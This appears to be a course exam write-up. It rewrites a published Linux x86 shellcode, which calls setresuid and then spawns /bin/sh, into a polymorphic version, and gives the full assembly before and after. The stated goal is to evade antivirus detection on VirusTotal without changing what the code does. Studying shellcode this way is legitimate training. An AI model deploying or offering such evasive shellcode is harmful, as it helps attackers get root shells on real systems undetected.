For the first part of this exam section, I chose a payload from user 
Netric[^1].  Its purpose is to set the EUID to 0, call EXECVE on "/bin/sh", and 
exit. Let's take a look:

{% highlight nasm %}
global _start

section .text
_start:
    xor eax,eax ; Clear EAX
    xor ebx,ebx ; Clear EBX
    xor ecx,ecx ; Clear ECX
    cdq         ; Clear EDX

    mov al,0xa4 ; SETRESUID
    int 0x80    ; Exec interrupt

    xor eax,eax ; Clear EAX
    push eax    ; Push null terminator

    push dword 0x68732f2f   ; //sh
    push dword 0x6e69622f   ; /bin

    mov ebx,esp ; Save pointer to path
    push eax    ; Push 0
    push ebx    ; Push pointer to path

    lea ecx,[esp]   ; Save args to ECX
    mov al,0xb  ; Load EXECVE syscall
    int 0x80    ; Exec interrupt

    xor eax,eax ; Clear EAX
    mov al,0x1  ; EXIT
    int 0x80    ; Exec interrupt

{% endhighlight %}

The code is straightforward and clean, with no trickery and little fat to 
trim. There's also not a lot to fingerprint, we shouldn't need to change much.
A VirusTotal scan[^2] showed the unmodified sample was flagged by two engines,
Avast and AVG.  

## Register initialization and SETRESUID

Not much changed here, just another way to zero out the registers before we 
get started:

{% highlight nasm %}
xor ebx, ebx    ; Clear EBX
xor ecx, ecx    ; Clear ECX
mul ebx         ; Clear EAX and EDX using MUL instead of XOR/CDQ

mov al,0xa4     ; SETRESUID
int 0x80        ; Exec interrupt
{% endhighlight %}

## EXECVE

This feels incredibly unoriginal, but I used the alteration demonstratred in
the lesson on Polymorphic code to load the "/bin//sh" string onto the stack. 
I also changed the location of the "//", and removed the instructions that 
populated EXECVE's ARGV argument since they were unnecessary:

{% highlight nasm %}
xor eax, eax    ; Clear EAX
push eax        ; Push null terminator

mov dword [esp-4],0x68732f6e    ; n/sh
mov dword [esp-8],0x69622f2f    ; //bi
sub esp,8       ; Adjust stack pointer

mov ebx,esp     ; Save pointer to path
; (Removed "push eax / push ebx / lea ecx,[esp]")
mov al,0xb      ; EXECVE
int 0x80        ; Exec interrupt
{% endhighlight %}

There's not much to change in the EXIT syscall, just using an `OR` instead of
a `MOV` to load `AL`:

{% highlight nasm %}
xor eax,eax     ; Clear EAX
or al,0x1       ; EXIT
int 0x80        ; Exec interrupt
{% endhighlight %}

...and we're done! VirusTotal seems happy now[^3], and shellcode functions
just as it did before.  We went from 41 to 44 bytes thanks to the change from 
`PUSH` to `MOV`.  Here's the final shellcode:
{% highlight nasm %}
global _start

section .text
_start:
    xor ebx,ebx
    xor ecx,ecx
    mul ebx

    mov al,0xa4
    int 0x80

    xor eax,eax
    push eax

    mov dword [esp-4],0x68732f6e
    mov dword [esp-8],0x69622f2f
    sub esp,8

    mov ebx,esp
    mov al,0xb
    int 0x80

    xor eax,eax
    or al,0x1
    int 0x80
{% endhighlight %}
